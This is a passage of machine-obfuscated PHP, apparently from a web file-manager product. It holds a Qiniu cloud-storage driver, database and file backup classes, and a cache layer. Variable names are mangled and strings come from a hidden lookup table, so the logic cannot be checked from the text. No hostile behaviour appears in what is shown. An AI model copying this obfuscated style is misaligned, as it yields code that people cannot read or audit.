trim($¯¾ˆæîı, $şçççıÚ[8]); $ùÚ¶œÚÌ = empty($¯¾ˆæîı) && $¯¾ˆæîı !== $şçççıÚ[197] ? $şçççıÚ[12] : $¯¾ˆæîı . $şçççıÚ[8]; $§³ŒÏÔ = $şçççıÚ[12]; $éåŞ±¢ = 500; $ÉÉÍÙß™ = $şçççıÚ[8]; $ƒ°’­íÚ = $¼Í‰Â§í = 0; while (!0) { check_abort(); list($Œ˜¬¨ªÈ, $“¶ÍÖøå) = $this->bucketManager->listFiles($this->bucket, $ùÚ¶œÚÌ, $§³ŒÏÔ, $éåŞ±¢, $ÉÉÍÙß™); if ($“¶ÍÖøå) { break; } $§³ŒÏÔ = array_key_exists($şçççıÚ[1414], $Œ˜¬¨ªÈ) ? $§³ŒÏÔ = $Œ˜¬¨ªÈ[$şçççıÚ[1447]] : $şçççıÚ[12]; if ($•µ·ùÌ) { if (!empty($Œ˜¬¨ªÈ[$şçççıÚ[1448]])) { $ƒ°’­íÚ += count($Œ˜¬¨ªÈ[$şçççıÚ[1448]]); } if (!empty($Œ˜¬¨ªÈ[$şçççıÚ[1449]])) { $¼Í‰Â§í += count($Œ˜¬¨ªÈ[$şçççıÚ[1449]]); } if ($§³ŒÏÔ === $şçççıÚ[12]) { break; } continue; } if ($óë­Õãå) { if (!empty($Œ˜¬¨ªÈ[$şçççıÚ[1448]])) { return !0; } } else { if (!empty($Œ˜¬¨ªÈ[$şçççıÚ[1449]])) { return !0; } } if ($§³ŒÏÔ === $şçççıÚ[12]) { break; } } if ($•µ·ùÌ) { return array($şçççıÚ[207] => $ƒ°’­íÚ, $şçççıÚ[208] => $¼Í‰Â§í); } return !1; } public function listAll($¸Î›ÅõÖ) { $Ù²•ôÓ… =& $_SERVER[óó‹¸‚å]; $øğãä¯¦ = $this->fileList($¸Î›ÅõÖ, $Ù²•ôÓ…[12], !0); $µÕ¼í½è = array(); foreach ($øğãä¯¦[$Ù²•ôÓ…[83]] as $îÄÓõ¬) { $µÕ¼í½è[$îÄÓõ¬[$Ù²•ôÓ…[94]]] = $îÄÓõ¬[$Ù²•ôÓ…[76]]; } foreach ($øğãä¯¦[$Ù²•ôÓ…[82]] as $îÄÓõ¬) { if (is_string($îÄÓõ¬)) { $µÕ¼í½è[$îÄÓõ¬] = 0; } } return $this->listAllFiles($¸Î›ÅõÖ, array_keys($µÕ¼í½è), $µÕ¼í½è); } private function fileList($ÃÓï†İù, $ÑÈ“—Ó = '', $¥Ù¶µîÑ = 0) { $ÈÛ¹Ï¥® =& $_SERVER[óó‹¸‚å]; $ÃÓï†İù = trim($ÃÓï†İù, $ÈÛ¹Ï¥®[8]); $’ñÎ¤’­ = empty($ÃÓï†İù) && $ÃÓï†İù !== $ÈÛ¹Ï¥®[197] ? $ÈÛ¹Ï¥®[12] : $ÃÓï†İù . $ÈÛ¹Ï¥®[8]; $ªÃŒÁÊª = $ÈÛ¹Ï¥®[12]; $ªÎª¥ø  = 1000; $ºÁÓŸµ = $ÂÜàÀº = array(); while (!0) { check_abort(); list($ìÍ¸ë¨, $ß š„á€) = $this->bucketManager->listFiles($this->bucket, $’ñÎ¤’­, $ªÃŒÁÊª, $ªÎª¥ø , $ÑÈ“—Ó); if ($ß š„á€) { break; } $ªÃŒÁÊª = array_key_exists($ÈÛ¹Ï¥®[1414], $ìÍ¸ë¨) ? $ªÃŒÁÊª = $ìÍ¸ë¨[$ÈÛ¹Ï¥®[1447]] : $ÈÛ¹Ï¥®[12]; $•Õ¦é…ê = isset($ìÍ¸ë¨[$ÈÛ¹Ï¥®[1448]]) ? $ìÍ¸ë¨[$ÈÛ¹Ï¥®[1448]] : array(); $«¸ƒÔ¼ = isset($ìÍ¸ë¨[$ÈÛ¹Ï¥®[1449]]) ? $ìÍ¸ë¨[$ÈÛ¹Ï¥®[1449]] : array(); foreach ($•Õ¦é…ê as $Ğ£ÄÏÓ) { if ($Ğ£ÄÏÓ[$ÈÛ¹Ï¥®[94]] == $’ñÎ¤’­) { continue; } $ÓÛ¡õ³ = $Ğ£ÄÏÓ[$ÈÛ¹Ï¥®[94]]; $«±¢†Îã = $Ğ£ÄÏÓ[$ÈÛ¹Ï¥®[1445]]; $Ğ£ÄÏÓ[$ÈÛ¹Ï¥®[76]] = $«±¢†Îã; $È‡†˜öë = $«±¢†Îã == 0 && substr($ÓÛ¡õ³, strlen($ÓÛ¡õ³) - 1, 1) == $ÈÛ¹Ï¥®[8] ? !0 : !1; $this->cacheMethodInfoSet($ÓÛ¡õ³, $È‡†˜öë, $Ğ£ÄÏÓ); if ($È‡†˜öë) { $ºÁÓŸµ[] = $ÓÛ¡õ³; continue; } $ÂÜàÀº[] = $¥Ù¶µîÑ ? $Ğ£ÄÏÓ : $ÓÛ¡õ³; } foreach ($«¸ƒÔ¼ as $ÓÛ¡õ³) { if ($ÓÛ¡õ³ == $’ñÎ¤’­) { continue; } $ºÁÓŸµ[] = $ÓÛ¡õ³; $this->cacheMethodInfoSet($ÓÛ¡õ³, !0); } if ($ªÃŒÁÊª === $ÈÛ¹Ï¥®[12]) { break; } } $this->cacheMethodInfoSet($ÃÓï†İù, !0); return array($ÈÛ¹Ï¥®[82] => $ºÁÓŸµ, $ÈÛ¹Ï¥®[83] => $ÂÜàÀº); } public function canRead($Šù’€üÍ) { return $this->exist($Šù’€üÍ) ? !0 : !1; } public function canWrite($Òƒ±·) { return $this->exist($Òƒ±·) ? !0 : !1; } public function getContent($šÀªÛï¤) { return $this->fileSubstr($šÀªÛï¤, 0, -1); } public function setContent($À¥ŸäÎÜ, $Úë×ŒŠú = '') { $“çÙØÛ‹ = $this->tempFile($this->pathThis($À¥ŸäÎÜ)); file_put_contents($“çÙØÛ‹, $Úë×ŒŠú); if ($this->upload($À¥ŸäÎÜ, $“çÙØÛ‹)) { $this->tempFileRemve($“çÙØÛ‹); return !0; } return !1; } public function refreshUrls($Îï‹Ğİ) { $æË±Ñº =& $_SERVER[óó‹¸‚å]; $ùÍâ€ƒ = array(); if (is_array($Îï‹Ğİ)) { foreach ($Îï‹Ğİ as $¡¡±Ô¿) { $ùÍâ€ƒ[] = $this->link($¡¡±Ô¿); } } else { $ùÍâ€ƒ[] = $this->link($Îï‹Ğİ); } $Ò™±¸Éû = new Qiniu\Cdn\CdnManager($this->auth); list($ùéö£¨Á, $ì‡¼ìÊ—) = $Ò™±¸Éû->refreshUrls($ùÍâ€ƒ); if ($ì‡¼ìÊ—) { return !1; } return $ùéö£¨Á[$æË±Ñº[1190]] == $æË±Ñº[764] ? !0 : !1; } public function fileSubstr($¶ÃæÙÃ, $§¨ğèÜ, $¦¶ ©­«) { $ÚÆÇö”æ =& $_SERVER[óó‹¸‚å]; if (!($µ†¹¼±ó = $this->link($¶ÃæÙÃ))) { return !1; } $Ğ°û§ôØ = !1; if ($¦¶ ©­« > 0) { $À•ûß·â = $§¨ğèÜ + $¦¶ ©­« - 1; $Ğ°û§ôØ = array($ÚÆÇö”æ[1450] . $§¨ğèÜ . $ÚÆÇö”æ[386] . $À•ûß·â); } $™õ© • = url_request($µ†¹¼±ó, $ÚÆÇö”æ[230], !1, $Ğ°û§ôØ); return $™õ© •[$ÚÆÇö”æ[754]] ? $™õ© •[$ÚÆÇö”æ[1210]] : !1; } public function upload($ÈàĞ ©ß, $³‹—Æáµ, $´ÆŸ‹Ê = false, $ıñçûÍ = REPEAT_REPLACE) { $™ø‚â»› = new Qiniu\Storage\UploadManager(); $ƒÆ¤œ”ë = $this->auth->uploadToken($this->bucket, $ÈàĞ ©ß); $Ó‡¾Ø©¨ = get_file_mime(get_path_ext($³‹—Æáµ)); list($¾îøæ½, $µíù±ç¼) = $™ø‚â»›->putFile($ƒÆ¤œ”ë, $ÈàĞ ©ß, $³‹—Æáµ, null, $Ó‡¾Ø©¨); return $µíù±ç¼ ? !1 : $this->getPathOuter($ÈàĞ ©ß); } public function uploadFormData($††Å¼ùç, $‚–°Í¶Ú = 3600) { return $this->uploadToken($††Å¼ùç, $‚–°Í¶Ú); } public function multiUploadFormData($‡—¦İ§ñ, $˜£ë™Ø› = 3600) { return $this->uploadToken($‡—¦İ§ñ, $˜£ë™Ø›); } private function uploadToken($ğ”ñıÙ´, $“ÙèŒÅ = 3600) { $É…¿½˜é =& $_SERVER[óó‹¸‚å]; $Æ„³º¥Ú = $“ÙèŒÅ; $áÎùºş† = array($É…¿½˜é[1451] => $É…¿½˜é[1452]); $şõ·µ³ = $ğ”ñıÙ´; $ôàÔÈßŠ = $this->auth->uploadToken($this->bucket, $şõ·µ³, $Æ„³º¥Ú, $áÎùºş†, !0); $á¤ˆ«„ñ = empty($this->region) || $this->region == $É…¿½˜é[1453] ? $É…¿½˜é[12] : $É…¿½˜é[386] . $this->region; $“Š³ÄÒš = http_type() . "\x3a\57\57\165\160\154\157\x61\x64{$á¤ˆ«„ñ}\56\x71\x69\x6e\151\x75\160\x2e\143\x6f\155\57"; return array($É…¿½˜é[1454] => $ôàÔÈßŠ, $É…¿½˜é[1455] => $“Š³ÄÒš); } public function download($äÉü“, $Ä‰×¹ï·) { $¤ö–Í¨ç = IO::getPathInner(IO::mkfile($Ä‰×¹ï·)); if (!($®Ø¿„ = $this->link($äÉü“))) { return !1; } $¬ç¹Áí‹ = 0; $–—ôÕ’Ñ = 1024 * 200; $•êüŸ©— = fopen($¤ö–Í¨ç, $_SERVER[óó‹¸‚å][1456]); while (!0) { $Öğ¹¦Âı = $this->fileSubstr($äÉü“, $¬ç¹Áí‹, $–—ôÕ’Ñ); if ($Öğ¹¦Âı === !1) { return !1; } fwrite($•êüŸ©—, $Öğ¹¦Âı); $¬ç¹Áí‹ += $–—ôÕ’Ñ; if (strlen($Öğ¹¦Âı) < $–—ôÕ’Ñ) { break; } } fclose($•êüŸ©—); return $Ä‰×¹ï·; } public function link($¡õö™Ã, $Ööí¹¢Ç = '') { if (!$this->isFile($¡õö™Ã)) { return !1; } $÷üÉË = $this->getHost() . $_SERVER[óó‹¸‚å][8] . $this->pathEncode($¡õö™Ã) . $Ööí¹¢Ç; return $this->auth->privateDownloadUrl($÷üÉË, 3600 * 12); } public function fileOut($õ°öş…Á, $¨Åˆ„™è = false, $ôôîÆ‘ï = false, $‘½åĞÙ• = '') { $£Ğ¥¿ =& $_SERVER[óó‹¸‚å]; if ($this->isFileOutServer()) { return $this->fileOutServer($õ°öş…Á, $¨Åˆ„™è, $ôôîÆ‘ï, $‘½åĞÙ•); } if (!$ôôîÆ‘ï) { $ôôîÆ‘ï = $this->pathThis($õ°öş…Á); } $§ÈğÂÀû = $¨Åˆ„™è ? $£Ğ¥¿[1457] . rawurlencode($ôôîÆ‘ï) : $£Ğ¥¿[12]; $Í¸ôÙŠ = $this->link($õ°öş…Á, $§ÈğÂÀû); $this->fileOutLink($Í¸ôÙŠ); } public function fileOutServer($‰˜”ñ÷ë, $Ÿ»³Çúô = false, $ÌÛˆ—©â = false, $¥…ØîÚ = '') { parent::fileOut($‰˜”ñ÷ë, $Ÿ»³Çúô, $ÌÛˆ—©â, $¥…ØîÚ); } public function fileOutImage($Ä„Æ§°å, $ß¨õÕüÇ = 250) { $›®ú¡å® = $this->link($Ä„Æ§°å, $_SERVER[óó‹¸‚å][1458] . $ß¨õÕüÇ); $this->fileOutLink($›®ú¡å®); } public function fileOutImageServer($–Ô´ø§, $¬ØÏ°ã€ = 250) { parent::fileOutImage($–Ô´ø§, $¬ØÏ°ã€); } public function hashMd5($¤Üº“šÕ) { $º©ùÔÊ =& $_SERVER[óó‹¸‚å]; $ãÉİºˆ¾ = $this->objectMeta($¤Üº“šÕ); return isset($ãÉİºˆ¾[$º©ùÔÊ[212]]) ? $ãÉİºˆ¾[$º©ùÔÊ[212]] : !1; $Ÿˆä©  = $this->link($¤Üº“šÕ, $º©ùÔÊ[1459]); } public function size($™àÄšÚú) { $ˆÕË Ä² = $this->objectMeta($™àÄšÚú); return $ˆÕË Ä² ? $ˆÕË Ä²[$_SERVER[óó‹¸‚å][76]] : 0; } public function info($­…©ã˜“) { if ($this->isFolder($­…©ã˜“)) { return $this->folderInfo($­…©ã˜“); } else { if ($this->isFile($­…©ã˜“)) { return $this->fileInfo($­…©ã˜“); } } return !1; } public function exist($ÁÛª‹õ) { return $this->isFile($ÁÛª‹õ) || $this->isFolder($ÁÛª‹õ); } public function isFile($°ğ«Èİ‹) { return !$this->isFolder($°ğ«Èİ‹) && $this->objectMeta($°ğ«Èİ‹); } public function isFolder($šâ¡ı) { return $this->cacheMethod($_SERVER[óó‹¸‚å][165], $šâ¡ı); } protected function objectMeta($Ç–±šÇĞ) { return $this->cacheMethod($_SERVER[óó‹¸‚å][167], $Ç–±šÇĞ); } protected function _objectMeta($×¥Ç‡‰Ü) { $¥ùÑÓ­ =& $_SERVER[óó‹¸‚å]; list($š¼ç•Í–, $Ä»ŸÙ¾Ç) = $this->bucketManager->stat($this->bucket, $×¥Ç‡‰Ü); if ($š¼ç•Í–) { $š¼ç•Í–[$¥ùÑÓ­[76]] = intval($š¼ç•Í–[$¥ùÑÓ­[1445]]); } return $š¼ç•Í–; } protected function _isFolder($Ğµ¬ºğÁ) { $¤ ÑÎ¼‘ =& $_SERVER[óó‹¸‚å]; if ($Ğµ¬ºğÁ == $¤ ÑÎ¼‘[12] || $Ğµ¬ºğÁ == $¤ ÑÎ¼‘[8]) { return !0; } list($ö¼©¿š¥, $ÀÆøê) = $this->bucketManager->listFiles($this->bucket, trim($Ğµ¬ºğÁ, $¤ ÑÎ¼‘[8]) . $¤ ÑÎ¼‘[8], $¤ ÑÎ¼‘[12], 1, $¤ ÑÎ¼‘[8]); return !empty($ö¼©¿š¥[$¤ ÑÎ¼‘[1448]]) || !empty($ö¼©¿š¥[$¤ ÑÎ¼‘[1449]]) ? !0 : !1; } } goto CÍ‡‚¶œ”ª; BÆ·ˆ¯ˆá¯: class BackupDbFile { public function __construct() { } public function index() { $í˜€İà× =& $_SERVER[óó‹¸‚å]; $ÕîéŒ€¨ = Backup::get(); $ØÈ ƒª = $ÕîéŒ€¨[$í˜€İà×[32]]; $¯ìŒ²— = $this->tmpFilesPath() . "\x62\x61\143\153\165\160\137{$ØÈ ƒª}\x2f"; $ñò¸ÎƒË = $this->backupPath($ÕîéŒ€¨); if (!($ñò¸ÎƒË = IO::mkdir($ñò¸ÎƒË))) { return !1; } $•ÙŞ»µâ = IO::listPath($¯ìŒ²—); $×œûÅš¬ = isset($•ÙŞ»µâ[$í˜€İà×[83]]) ? $•ÙŞ»µâ[$í˜€İà×[83]] : array(); $é¼±¹éû = array_sum(array_column($×œûÅš¬, $í˜€İà×[76])); if (!$é¼±¹éû) { return !1; } $¦æÃæİ— = array($í˜€İà×[802] => $é¼±¹éû, $í˜€İà×[803] => time()); Backup::set($¦æÃæİ—); $•¹¶ó¬ = new TaskFileTransfer($í˜€İà×[804], $í˜€İà×[784], count($×œûÅš¬), LNG($í˜€İà×[785]) . $í˜€İà×[386] . LNG($í˜€İà×[787]) . $í˜€İà×[805]); $•¹¶ó¬->task[$í˜€İà×[767]] = $é¼±¹éû; foreach ($•ÙŞ»µâ[$í˜€İà×[83]] as $ô‰ËÖâù) { $İÆÍ¦¼Ï = IO::move($ô‰ËÖâù[$í˜€İà×[84]], $ñò¸ÎƒË); if (!$İÆÍ¦¼Ï) { $•¹¶ó¬->end(); $®èÁ‡ = IO::getLastError($í˜€İà×[806] . $ô‰ËÖâù[$í˜€İà×[84]] . $í˜€İà×[807] . $ñò¸ÎƒË . $í˜€İà×[164]); write_log($®èÁ‡, $í˜€İà×[784]); return !1; } } $Ø§œîÆ¤ = new DbManage(); $©“Şãòé = $Ø§œîÆ¤->getSqlFile(); if (!$©“Şãòé[$í˜€İà×[808]] || !$©“Şãòé[$í˜€İà×[13]]) { return !1; } IO::move($©“Şãòé[$í˜€İà×[808]], $ñò¸ÎƒË); IO::move($©“Şãòé[$í˜€İà×[13]], $ñò¸ÎƒË); $•¹¶ó¬->end(); $¦æÃæİ— = array($í˜€İà×[809] => $é¼±¹éû, $í˜€İà×[810] => time()); Backup::set($¦æÃæİ—); return !0; } private function backupPath($ë®¯å¬ˆ) { $¦¯äé§÷ =& $_SERVER[óó‹¸‚å]; $Ö»äø™ = $ë®¯å¬ˆ[$¦¯äé§÷[32]]; $ğ–³Û÷ = Model($¦¯äé§÷[774])->get($¦¯äé§÷[775]); $ËşÒ†Ë— = substr(md5($¦¯äé§÷[776] . $ğ–³Û÷ . $Ö»äø™), 0, 8); return "\173\151\x6f\x3a{$ë®¯å¬ˆ[$¦¯äé§÷[756]]}\x7d\57\144\x61\x74\x61\142\x61\x73\x65\57\142\x61\x63\x6b\x75\160\x2f" . $Ö»äø™ . $¦¯äé§÷[11] . $ËşÒ†Ë—; } private function tmpFilesPath() { $¿ßÅ·Æ€ =& $_SERVER[óó‹¸‚å]; $ÚŠ®â©é = TEMP_FILES; if ($GLOBALS[$¿ßÅ·Æ€[6]][$¿ßÅ·Æ€[89]][$¿ßÅ·Æ€[800]]) { $ÚŠ®â©é = $GLOBALS[$¿ßÅ·Æ€[6]][$¿ßÅ·Æ€[89]][$¿ßÅ·Æ€[800]]; if (!mk_dir($ÚŠ®â©é) || !is_writable($ÚŠ®â©é) || !IO::mkfile($ÚŠ®â©é . $¿ßÅ·Æ€[801])) { $ÚŠ®â©é = TEMP_FILES; } } return $ÚŠ®â©é; } } class BackupFile { public function __construct() { } public function index() { $°Â„íœ = Backup::get(); $Ï™Ï÷Ï£ = $°Â„íœ[$_SERVER[óó‹¸‚å][293]][$_SERVER[óó‹¸‚å][199]][$_SERVER[óó‹¸‚å][468]]; $Ù¤Ò•ğ = array($_SERVER[óó‹¸‚å][469] => array($_SERVER[óó‹¸‚å][811], $Ï™Ï÷Ï£), $_SERVER[óó‹¸‚å][812] => array($_SERVER[óó‹¸‚å][331], $°Â„íœ[$_SERVER[óó‹¸‚å][756]])); $şËòÎÔ = (int) Model($_SERVER[óó‹¸‚å][793])->where($Ù¤Ò•ğ)->count($_SERVER[óó‹¸‚å][468]); $üŸÔ˜°º = (int) Model($_SERVER[óó‹¸‚å][793])->where($Ù¤Ò•ğ)->sum($_SERVER[óó‹¸‚å][76]); $¹¼ÖÏ»´ = new TaskFileTransfer($_SERVER[óó‹¸‚å][813], $_SERVER[óó‹¸‚å][784], $şËòÎÔ, LNG($_SERVER[óó‹¸‚å][785]) . $_SERVER[óó‹¸‚å][786] . LNG($_SERVER[óó‹¸‚å][814])); $¹¼ÖÏ»´->task[$_SERVER[óó‹¸‚å][767]] = $üŸÔ˜°º; $İ³ÛÓã½ = array($_SERVER[óó‹¸‚å][815] => $şËòÎÔ, $_SERVER[óó‹¸‚å][816] => $üŸÔ˜°º, $_SERVER[óó‹¸‚å][817] => time()); Backup::set($İ³ÛÓã½); $åî€µöİ = !0; $İÆ¤…ã¯ = $this->storeIds(); $ì–»Â—’ = 1; $Äìø¼ö„ = 1000; $ŒŒùÃÒÑ = $¶µ¢œÅ = 0; $³Û”ÅÔ = array(); $ÄıïôŞ = $ÈåÖ›º¡ = 0; do { $ÃîÖš£ = $_SERVER[óó‹¸‚å][818]; $à¶€«éÑ = Model($_SERVER[óó‹¸‚å][793])->where($Ù¤Ò•ğ)->field($ÃîÖš£)->order($_SERVER[óó‹¸‚å][819])->selectPage($Äìø¼ö„, $ì–»Â—’); $âÜ‡œéÛ = !empty($à¶€«éÑ[$_SERVER[óó‹¸‚å][369]]) ? $à¶€«éÑ[$_SERVER[óó‹¸‚å][369]] : array(); foreach ($âÜ‡œéÛ as $ğÁËÃÈ†) { if (!$this->_fileExist($ğÁËÃÈ†, $³Û”ÅÔ, $İÆ¤…ã¯)) { $şËòÎÔ -= 1; $üŸÔ˜°º -= (int) $ğÁËÃÈ†[$_SERVER[óó‹¸‚å][76]]; write_log("\146\151\154\145\40\x6e\x6f\x74\x20\145\170\151\163\x74\x2e\146\x69\x6c\x65\x49\x44\x3a{$ğÁËÃÈ†[$_SERVER[óó‹¸‚å][468]]}\54\x20\160\141\x74\x68\x3a{$ğÁËÃÈ†[$_SERVER[óó‹¸‚å][84]]}", $_SERVER[óó‹¸‚å][820]); continue; } $ÁñˆÚ = $ğÁËÃÈ†[$_SERVER[óó‹¸‚å][84]]; $¢–ÖõŠÎ = "\x7b\x69\x6f\x3a{$°Â„íœ[$_SERVER[óó‹¸‚å][756]]}\175" . substr($ÁñˆÚ, strlen("\x7b\151\157\x3a{$ğÁËÃÈ†[$_SERVER[óó‹¸‚å][821]]}\175")); if (IO::exist($¢–ÖõŠÎ)) { $¹¼ÖÏ»´->updateFileEnd($ğÁËÃÈ†[$_SERVER[óó‹¸‚å][32]], $ğÁËÃÈ†[$_SERVER[óó‹¸‚å][76]]); } else { $¢–ÖõŠÎ = get_path_father($¢–ÖõŠÎ); IO::mkdir($¢–ÖõŠÎ); if (!IO::copy($ÁñˆÚ, $¢–ÖõŠÎ, $_SERVER[óó‹¸‚å][822])) { write_log($_SERVER[óó‹¸‚å][823] . $ÁñˆÚ . $_SERVER[óó‹¸‚å][807] . $¢–ÖõŠÎ . $_SERVER[óó‹¸‚å][164], $_SERVER[óó‹¸‚å][784]); $åî€µöİ = !1; break; } } $Ï™Ï÷Ï£ = $ğÁËÃÈ†[$_SERVER[óó‹¸‚å][468]]; $¶µ¢œÅ += 1; $ŒŒùÃÒÑ += $ğÁËÃÈ†[$_SERVER[óó‹¸‚å][76]]; $ÈåÖ›º¡ += 1; $ÄıïôŞ += $ğÁËÃÈ†[$_SERVER[óó‹¸‚å][76]]; if ($ŒŒùÃÒÑ >= 1024 * 1024 * 100) { $İ³ÛÓã½ = array($_SERVER[óó‹¸‚å][824] => $Ï™Ï÷Ï£, $_SERVER[óó‹¸‚å][825] => $ÈåÖ›º¡, $_SERVER[óó‹¸‚å][826] => $ÄıïôŞ); Backup::set($İ³ÛÓã½); $ŒŒùÃÒÑ = $¶µ¢œÅ = 0; } } $áçá·ü— = count($âÜ‡œéÛ); $ì–»Â—’++; } while ($áçá·ü— == $Äìø¼ö„); $¹¼ÖÏ»´->end(); $İ³ÛÓã½ = array($_SERVER[óó‹¸‚å][827] => 1, $_SERVER[óó‹¸‚å][497] => time(), $_SERVER[óó‹¸‚å][779] => 1, $_SERVER[óó‹¸‚å][824] => $Ï™Ï÷Ï£, $_SERVER[óó‹¸‚å][816] => $üŸÔ˜°º, $_SERVER[óó‹¸‚å][815] => $şËòÎÔ, $_SERVER[óó‹¸‚å][828] => time()); if ($¶µ¢œÅ) { $İ³ÛÓã½[$_SERVER[óó‹¸‚å][825]] = $ÈåÖ›º¡; $İ³ÛÓã½[$_SERVER[óó‹¸‚å][826]] = $ÄıïôŞ; } Backup::set($İ³ÛÓã½); $this->_fileFilter($³Û”ÅÔ); return !0; } private function _fileExist($™Î†š–, &$íŠ†‚íÅ, $ÆØ¦âñ’) { $¦×Ò’º =& $_SERVER[óó‹¸‚å]; $ÃÁÇ»Ï´ = $™Î†š–[$¦×Ò’º[84]]; if (in_array($™Î†š–[$¦×Ò’º[468]], $íŠ†‚íÅ)) { return !1; } if (!in_array($™Î†š–[$¦×Ò’º[821]], $ÆØ¦âñ’)) { return !1; } if (IO::exist($ÃÁÇ»Ï´)) { return !0; } $ÒĞ—â® = get_path_father($ÃÁÇ»Ï´); if (IO::exist($ÒĞ—â®)) { $íŠ†‚íÅ[] = $™Î†š–[$¦×Ò’º[468]]; return !1; } $ª»†Â ® = array($¦×Ò’º[821] => $™Î†š–[$¦×Ò’º[821]], $¦×Ò’º[84] => array($¦×Ò’º[383], "{$ÒĞ—â®}\45")); $Ş²ä‡ÖÒ = Model($¦×Ò’º[793])->where($ª»†Â ®)->field($¦×Ò’º[469])->select(); $íŠ†‚íÅ = array_merge($íŠ†‚íÅ, array_to_keyvalue($Ş²ä‡ÖÒ, $¦×Ò’º[12], $¦×Ò’º[468])); return !1; } private function _fileFilter($µœÓ³Ğ£) { $¡ãÎ¿ÍŠ =& $_SERVER[óó‹¸‚å]; if (empty($µœÓ³Ğ£)) { return; } $½Ÿ›¡¾— = array($¡ãÎ¿ÍŠ[468] => array($¡ãÎ¿ÍŠ[7], array_unique($µœÓ³Ğ£))); $¯ˆö±æä = Model($¡ãÎ¿ÍŠ[829])->where($½Ÿ›¡¾—)->field($¡ãÎ¿ÍŠ[402])->select(); foreach ($¯ˆö±æä as $èÒ¾¾ôÒ) { Model($¡ãÎ¿ÍŠ[829])->remove($èÒ¾¾ôÒ[$¡ãÎ¿ÍŠ[402]], !1); } } private function storeIds() { $İ·•Ç² =& $_SERVER[óó‹¸‚å]; $¦ç‹ë = Model($İ·•Ç²[771])->listData(); $†Á€×Û¬ = array(); $ÏÊà  = $GLOBALS[$İ·•Ç²[6]][$İ·•Ç²[89]][$İ·•Ç²[830]]; foreach ($¦ç‹ë as $šÍêƒ‰) { $™ª‘»ËÖ = strtolower($šÍêƒ‰[$İ·•Ç²[95]]); if (!isset($ÏÊà [$™ª‘»ËÖ])) { continue; } $şÆÅÖû¶ = $İ·•Ç²[74] . (isset($ÏÊà [$™ª‘»ËÖ]) ? $ÏÊà [$™ª‘»ËÖ] : ucfirst($™ª‘»ËÖ)); if (!class_exists($şÆÅÖû¶)) { continue; } $†Á€×Û¬[] = $šÍêƒ‰[$İ·•Ç²[399]]; } return $†Á€×Û¬; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $‘âøƒõö =& $_SERVER[óó‹¸‚å]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $‘úÂƒ¢´ = $GLOBALS[$‘âøƒõö[6]][$‘âøƒõö[349]]; $Ü°×Âíß = $‘úÂƒ¢´[$‘úÂƒ¢´[$‘âøƒõö[831]]]; $¸ÙŒÜ = $‘úÂƒ¢´[$‘âøƒõö[832]]; switch ($‘úÂƒ¢´[$‘âøƒõö[831]]) { case $‘âøƒõö[21]: self::$handle = Model($‘âøƒõö[833]); break; case $‘âøƒõö[834]: self::$handle = new CacheRedis($Ü°×Âíß, $¸ÙŒÜ); break; case $‘âøƒõö[835]: self::$handle = new CacheMemcached($Ü°×Âíß, $¸ÙŒÜ); break; case $‘âøƒõö[199]: self::$handle = new CacheFile($Ü°×Âíß, $¸ÙŒÜ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($»öñ³ÃŞ) { if (is_array($»öñ³ÃŞ) || is_object($»öñ³ÃŞ)) { $»öñ³ÃŞ = json_encode($»öñ³ÃŞ); } $»öñ³ÃŞ = rawurlencode($»öñ³ÃŞ); return md5(KOD_SITE_ID . $_SERVER[óó‹¸‚å][11] . $»öñ³ÃŞ); } public static function get($µ¥±Ïàæ, $Œµ®˜¦Æ = false) { $âÄÌÒ²Æ = self::key($µ¥±Ïàæ); if ($Œµ®˜¦Æ) { return unserialize(self::init()->get($âÄÌÒ²Æ)); } if (!isset(self::$memoryCache[$âÄÌÒ²Æ])) { $’ˆÇâà„ = self::init()->get($âÄÌÒ²Æ); self::$memoryCache[$âÄÌÒ²Æ] = unserialize($’ˆÇâà„); } return self::$memoryCache[$âÄÌÒ²Æ]; } public static function set($ñıÒëü“, $ı¡ÕÊ±Ê, $ĞÊé²Ğ = false) { $øò«”‘ = self::key($ñıÒëü“); if (isset(self::$memoryCache[$øò«”‘]) && self::$memoryCache[$øò«”‘] === $ı¡ÕÊ±Ê) { return !0; } if ($ĞÊé²Ğ === 0) { self::$memoryCache[$øò«”‘] = $ı¡ÕÊ±Ê; return !0; } CacheLock::lock($ñıÒëü“); $Şé¦Ñ«¬ = self::init()->set($øò«”‘, serialize($ı¡ÕÊ±Ê), $ĞÊé²Ğ); self::$memoryCache[$øò«”‘] = $ı¡ÕÊ±Ê; CacheLock::unlock($ñıÒëü“); return $Şé¦Ñ«¬; } public static function getCall($úŸã„ï», $úñÜÛ™, $½âÜãº›, $şøœåÑ— = array()) { $¯Áß¥ =& $_SERVER[óó‹¸‚å]; $á§Ù¯üï = self::get($úŸã„ï»); if ($á§Ù¯üï || $á§Ù¯üï === $¯Áß¥[12]) { return $á§Ù¯üï; } $á§Ù¯üï = call_user_func_array($½âÜãº›, $şøœåÑ—); $á§Ù¯üï = $á§Ù¯üï ? $á§Ù¯üï : $¯Áß¥[12]; self::set($úŸã„ï», $á§Ù¯üï, $úñÜÛ™); return $á§Ù¯üï; } public static function remove($¤£…Û¿) { $¨×ÍÍü§ = self::key($¤£…Û¿); unset(self::$memoryCache[$¨×ÍÍü§]); self::clearTimeout(); CacheLock::lock($¤£…Û¿); $Çäì£ÂÖ = self::init()->remove($¨×ÍÍü§); CacheLock::unlock($¤£…Û¿); return $Çäì£ÂÖ; } public static function removeMemory($õÎÓ¡Ğ‡) { $·ÓØ²¾ƒ = self::key($õÎÓ¡Ğ‡); unset(self::$memoryCache[$·ÓØ²¾ƒ]); } public static function clearMemory($¨Ç†õüÀ = false) { if ($¨Ç†õüÀ) { $¨Ç†õüÀ = self::key($¨Ç†õüÀ); unset(self::$memoryCache[$¨Ç†õüÀ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[óó‹¸‚å][836])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[óó‹¸‚å][837])) { self::init()->clearTimeout(); } } } goto a³¸Õ‰ˆàß; FÖÅôÁ’¿: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($€ş“ş“«) { $äğÕÓÏ =& $_SERVER[óó‹¸‚å]; $ºª»–é÷ = KodIO::fileTypeList(); $Ä×«ı¯ = $ºª»–é÷[$€ş“ş“«]; if (!$Ä×«ı¯) { return array(); } $¥­¨ùñå = 